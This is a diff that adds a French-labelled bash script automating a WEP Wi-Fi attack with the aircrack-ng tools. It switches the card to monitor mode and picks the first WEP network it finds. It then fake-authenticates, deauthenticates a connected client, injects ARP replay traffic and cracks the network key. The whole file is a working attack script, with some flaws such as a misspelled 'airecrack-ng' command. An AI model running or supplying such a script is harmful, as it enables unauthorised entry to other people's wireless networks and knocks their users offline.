@@ -1,0 +1,41 @@
+#!/bin/bash 
+
+ip link set wlan0 down
+iwconfig wlan0 mode monitor
+ip link set wlan0 up
+xterm -e "airodump-ng --encrypt wep -w TEST1 wlan0 | sleep 2m | exit" 
+
+cut -d "," -f 14 TEST1-01.csv >> tete.csv
+grep -Ev "^\s*$" tete.csv >> tete2.csv
+ESSID=$(sed -n 2p tete2.csv)
+
+cut -d "," -f 1,14 TEST1-01.csv >> presque.csv
+BSSID=$(grep "$ESSID" presque.csv | cut -d "," -f 1)
+
+rm TEST1-01*
+rm tete*
+rm tete2*
+rm tete3*
+rm presque.csv
+
+if [ -n "$BSSID" ] && [ -n "$ESSID" ] 
+then 
+	xterm -e "airodump-ng --write Toto --bssid $BSSID wlan0 " &
+	cut -d "," -f 2 Toto-01.csv >> toto.csv 
+	Utilisateur=$(sed -n 6p toto.csv )
+	rm Toto-01*
+	rm toto*
+
+	if [ -z "$Utilisateur" ]
+	then 
+		xterm -e "aircrack-ng -z *.cap --write Resultat.csv "
+	else
+		xterm -e "aireplay-ng -1 0 -e $ESSID -a $BSSID -h $Utilisateur wlan0 "
+		xterm -e "aireplay-ng --deauth 5 -a $BSSID -c $Utilisateur wlan0"
+		xterm -e "aireplay-ng -3 -e $ESSID -b $BSSID -h $Utilisateur wlan0"
+		sleep 10m
+		xterm -e "airecrack-ng -z *.cap --write Resultat.csv "
+	fi
+else 
+	echo "test" 
+fi
